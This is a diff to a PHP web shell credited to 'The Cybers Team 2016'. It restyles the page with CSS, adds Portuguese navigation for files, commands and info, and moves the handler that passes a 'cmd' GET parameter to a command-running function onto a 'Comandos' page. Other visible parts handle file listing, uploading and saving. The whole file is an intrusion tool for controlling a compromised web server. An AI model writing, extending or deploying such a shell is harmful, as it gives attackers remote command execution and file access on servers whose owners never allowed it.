@@ -159,6 +159,27 @@ a{
 	float:left;
 }
 
+#shell{
+	float: left;
+	width: 100%;
+}
+
+section{
+	background-color: #141414;
+	border-radius: 5px;
+	border: 1px solid #222;
+	width:100%;
+}
+
+section header{
+	padding:10px;
+	background-color: #222;
+}
+
+section article{
+	padding:10px;
+}
+
 ";
 }
 ?>
@@ -240,17 +261,44 @@ echo "
 </center>
 <nav>
 	<ul>
-		<li>Arquivos</li>
-		<li>Comandos</li>
-		<li>Info</li>
+		<li><a href='shell.php'>Arquivos</a></li>
+		<li><a href='?pag=comandos'>Comandos</a></li>
+		<li><a href='?pag=info'>Info</a></li>
 	</ul>
 </nav>
 ";
 
+echo "<div id='shell'>";
+
 $page = $_GET['pag'];
 if($page == 'comandos'){
-	executar();
+
+	echo "
+		<section>
+			<header>Comandos</header>
+			<article>
+			";
+			if($cmd = $_GET['cmd']){
+				cmd($cmd, $diretorio);
+			}
+			executar();
+			echo"
+			</article>
+		</section>
+	";
 }
+
+else if($page == 'info'){
+		echo "
+		<section>
+			<header>Informações</header>
+			<article>
+			informações aqui...
+			</article>
+		</section>
+	";
+}
+
 else{
 	listar($diretorio);	
 }
@@ -260,8 +308,9 @@ else{
 // 	<input name='logout' type='submit' value='Logout'>
 // </form>
 // ";
-
 echo "<center><a id='rodape' href='http://www.fb.com/TheCybersTeam' title='Coded by OFFSET'>The Cybers Team 2016</a></center>";
+
+echo "</div>";
 }
 
 function login(){
@@ -522,9 +571,6 @@ function login(){
 		upload($upar, $diretorio);
 	}
 
-	if($cmd = $_GET['cmd']){
-		cmd($cmd, $diretorio);
-	}
 
 	if($criar = $_POST['criar'] and $nome = $_POST['nome']){
 		salvar($criar, "$diretorio/$nome");
